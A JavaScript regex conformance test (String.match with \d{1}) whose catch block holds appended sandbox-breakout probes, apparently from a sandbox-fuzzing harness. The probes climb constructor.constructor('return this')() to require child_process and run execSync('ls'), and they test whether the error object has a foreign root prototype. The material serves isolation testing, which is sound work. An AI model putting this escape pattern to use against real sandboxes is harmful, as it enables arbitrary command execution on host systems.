try {
    var __matches = [
        '1',
        '2',
        '3',
        '4',
        '5',
        '6',
        '7',
        '8',
        '9',
        '0'
    ];
    var __string = '123456abcde7890';
    if (__string.match(/\d{1}/g).length !== 10) {
        $ERROR('#1: __string = "123456abcde7890"; __string.match(/\\d{1}/g).length=== 10. Actual: ' + __string.match(/\d{1}/g).length);
    }
    for (var mi = 0; mi < __matches.length; mi++) {
        if (__string.match(/\d{1}/g)[mi] !== __matches[mi]) {
            $ERROR('#2.' + mi + ': __matches=["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]; __string = "123456abcde7890"; __string.match(/\\d{1}/g)[' + mi + ']===__matches[' + mi + ']. Actual: ' + __string.match(/\d{1}/g)[mi]);
        }
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}